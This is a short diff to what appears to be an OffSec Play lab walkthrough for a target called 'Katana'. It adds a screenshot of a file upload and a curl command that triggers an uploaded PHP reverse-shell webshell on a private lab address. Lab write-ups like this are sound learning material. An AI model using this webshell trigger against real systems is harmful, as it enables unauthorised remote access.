@@ -318,3 +318,11 @@ Extension
 http://192.168.172.83:8088/upload.html
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/b3a3188a-5332-49f2-939a-33f63e698b7d)
+
+File Upload:
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/9179b079-529a-4f25-931b-37338d25e978)
+
+Trigger the webshell:
+```curl
+> curl http://192.168.172.83:8715/katana_php-reverse-shell.php
+```
